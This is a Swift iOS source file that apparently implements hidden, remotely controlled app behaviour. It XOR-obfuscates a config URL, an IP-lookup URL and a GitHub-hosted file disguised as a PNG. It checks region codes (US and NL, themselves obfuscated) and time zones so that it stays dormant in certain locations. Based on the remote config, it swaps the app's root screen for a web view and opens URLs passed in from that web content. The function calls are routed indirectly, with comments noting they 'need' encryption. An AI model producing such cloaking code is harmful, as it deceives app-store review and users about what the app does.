
import Foundation
import UIKit
//import AdjustSdk
import AppsFlyerLib

//func encrypt(_ input: String, key: UInt8) -> String {
//    let bytes = input.utf8.map { $0 ^ key }
//        let data = Data(bytes)
//        return data.base64EncodedString()
//}

func rtasji(_ input: String) -> String? {
    let k: UInt8 = 123
    guard let data = Data(base64Encoded: input) else { return nil }
    let decryptedBytes = data.map { $0 ^ k }
    return String(bytes: decryptedBytes, encoding: .utf8)
}

//https://api.my-ip.io/v2/ip.json   t6urr6zl8PC+r7bxsqbytq/xtrDwqe3wtq/xtaywsQ==
internal let kNbashjiew = "Ew8PCwhBVFQaCxJVFgJWEgtVEhRUDUlUEgtVEQgUFQ=="         //Ip ur

//https://mock.mengxuegu.com/mock/69e58d39c338094cf83198fa/svs/VolatilityData
internal let kFainaso = "Ew8PCwhBVFQWFBgQVRYeFRwDDh4cDlUYFBZUFhQYEFRNQh5OQx9IQhhISENLQk8YHUNISkJDHRpUCA0IVC0UFxoPEhcSDwI/Gg8a"

// https://raw.githubusercontent.com/jduja/svlota/main/svolat.png
// Ew8PCwhBVFQJGgxVHBIPEw4ZDggeCRgUFQ8eFQ9VGBQWVBEfDhEaVAgNFxQPGlQWGhIVVAgNFBcaD1ULFRw=
internal let kDoapiens = "Ew8PCwhBVFQJGgxVHBIPEw4ZDggeCRgUFQ8eFQ9VGBQWVBEfDhEaVAgNFxQPGlQWGhIVVAgNFBcaD1ULFRw="

/*--------------------Tiao yuansheng------------------------*/
//need jia mi
internal func Kaonehus() {
//    UIApplication.shared.windows.first?.rootViewController = vc
    
    DispatchQueue.main.async {
        if let ws = UIApplication.shared.connectedScenes.first as? UIWindowScene {
//            let tp = ws.windows.first!.rootViewController! as! UINavigationController
            let tp = ws.windows.first!.rootViewController!
            for view in tp.view.subviews {
                if view.tag == 191 {
                    view.removeFromSuperview()
                }
            }
        }
    }
}

// MARK: - 加密调用全局函数HandySounetHmeSh
internal func Mnajheiws() {
    let fName = ""
    
    let fctn: [String: () -> Void] = [
        fName: Kaonehus
    ]
    
    fctn[fName]?()
}


/*--------------------Tiao wangye------------------------*/
//need jia mi
internal func AUENHS(_ dt: Xisoyr) {
    DispatchQueue.main.async {
        
        UserDefaults.standard.setModel(dt, forKey: "Xisoyr")
        UserDefaults.standard.synchronize()
        
        let vc = KncoyrbViewController()
        vc.jsieiiae = dt
        UIApplication.shared.windows.first?.rootViewController = vc
    }
}


internal func Jaieins(_ param: Xisoyr) {
    let fName = ""

    typealias rushBlitzIusj = (Xisoyr) -> Void
    
    let fctn: [String: rushBlitzIusj] = [
        fName : AUENHS
    ]
    
    fctn[fName]?(param)
}

let Nam = "name"
let DT = "data"
let UL = "url"

/*--------------------Tiao wangye------------------------*/
//need jia mi
//af_revenue/af_currency
func zbhasoe(_ dic: [String : String]) {
    var dataDic: [String : Any]?
    if let data = dic["params"] {
        if data.count > 0 {
            dataDic = data.stringTo()
        }
    }
    if let data = dic["data"] {
        dataDic = data.stringTo()
    }

    let name = dic[Nam]
    print(name!)
    
    if dataDic?[amt] != nil && dataDic?[ren] != nil {
        AppsFlyerLib.shared().logEvent(name: String(name!), values: [AFEventParamRevenue : dataDic![amt] as Any, AFEventParamCurrency: dataDic![ren] as Any]) { dic, error in
            if (error != nil) {
                print(error as Any)
            }
        }
    } else {
        AppsFlyerLib.shared().logEvent(name!, withValues: dataDic)
    }
    
    if name == OpWin {
        if let str = dataDic![UL] {
            UIApplication.shared.open(URL(string: str as! String)!)
        }
    }
}

internal func amskioie(_ param: [String : String]) {
    let fName = ""
    typealias maxoPams = ([String : String]) -> Void
    let fctn: [String: maxoPams] = [
        fName : zbhasoe
    ]
    
    fctn[fName]?(param)
}


//internal func Oismakels(_ param: [String : String], _ param2: [String : String]) {
//    let fName = ""
//    typealias maxoPams = ([String : String], [String : String]) -> Void
//    let fctn: [String: maxoPams] = [
//        fName : ZuwoAsuehna
//    ]
//    
//    fctn[fName]?(param, param2)
//}


internal struct Daisno: Codable {

    let country: Seozns?
    
    struct Seozns: Codable {
        let code: String
    }

}

internal struct Xisoyr: Codable {
    
    let jsiuen: String?         //key arr
    let cuuhas: [String]?            // yeu nan xianzhi
    let lapien: String?         // shi fou kaiqi
    let mdnjai: String?         // jum
    let eiansh: String?          // backcolor
    let lpeiunb: String?
    let eiuauns: String?   //ad key
    let midnje: String?   // app id
    let nvuahe: String?  // bri co
}

//internal func JaunLowei() {
//    if isTm() {
//        if UserDefaults.standard.object(forKey: "same") != nil {
//            WicoiemHusiwe()
//        } else {
//            if GirhjyKaom() {
//                LznieuBysuew()
//            } else {
//                WicoiemHusiwe()
//            }
//        }
//    } else {
//        WicoiemHusiwe()
//    }
//}

// MARK: - 加密调用全局函数HandySounetHmeSh
//internal func Kapiney() {
//    let fName = ""
//    
//    let fctn: [String: () -> Void] = [
//        fName: JaunLowei
//    ]
//    
//    fctn[fName]?()
//}


//func isTm() -> Bool {
//   
//  // 2026-04-08 03:21:43
//  //1775593303
//  let ftTM = 1775593303
//  let ct = Date().timeIntervalSince1970
//  if ftTM - Int(ct) > 0 {
//    return false
//  }
//  return true
//}

//func iPLIn() -> Bool {
//    // 获取用户设置的首选语言（列表第一个）
//    guard let cysh = Locale.preferredLanguages.first else {
//        return false
//    }
//    // 印尼语代码：id 或 in（兼容旧版本）
//    return cysh.hasPrefix("id") || cysh.hasPrefix("in")
//}


//private let cdo = ["US","NL"]
private let cdo = [rtasji("Lig="), rtasji("NTc=")]

// 时区控制
func Klaonzee() -> Bool {
    
    if let rc = Locale.current.regionCode {
//        print(rc)
        if cdo.contains(rc) {
            return false
        }
    }

    let offset = NSTimeZone.system.secondsFromGMT() / 3600
    if (offset >= 0 && offset < 3) || (offset > -11 && offset < -4) {
        return false
    }
    
    return true
}

//func contraintesRiuaogOKuese() -> Bool {
//    let offset = NSTimeZone.system.secondsFromGMT() / 3600
//    if offset > 6 && offset < 9 {
//        return true
//    }
//    return false
//}


extension String {
    func stringTo() -> [String: AnyObject]? {
        let jsdt = data(using: .utf8)
        
        var dic: [String: AnyObject]?
        do {
            dic = try (JSONSerialization.jsonObject(with: jsdt!, options: .mutableContainers) as? [String : AnyObject])
        } catch {
            print("parse error")
        }
        return dic
    }
    
}

extension UIColor {
    convenience init(hex: Int, alpha: CGFloat = 1.0) {
        let red = CGFloat((hex >> 16) & 0xFF) / 255.0
        let green = CGFloat((hex >> 8) & 0xFF) / 255.0
        let blue = CGFloat(hex & 0xFF) / 255.0
        self.init(red: red, green: green, blue: blue, alpha: alpha)
    }
    convenience init?(hexString: String, alpha: CGFloat = 1.0) {
        var formatted = hexString
            .trimmingCharacters(in: .whitespacesAndNewlines)
            .replacingOccurrences(of: "#", with: "")
        
        // 处理短格式 (如 "F2A" -> "FF22AA")
        if formatted.count == 3 {
            formatted = formatted.map { "\($0)\($0)" }.joined()
        }
        
        guard let hex = Int(formatted, radix: 16) else { return nil }
        self.init(hex: hex, alpha: alpha)
    }
}

extension UserDefaults {
    
    func setModel<T: Codable>(_ model: T, forKey key: String) {
        let encoder = JSONEncoder()
        if let data = try? encoder.encode(model) {
            set(data, forKey: key)
        }
    }
    
    func getModel<T: Codable>(_ type: T.Type, forKey key: String) -> T? {
        guard let data = data(forKey: key) else { return nil }
        let decoder = JSONDecoder()
        return try? decoder.decode(type, from: data)
    }
}

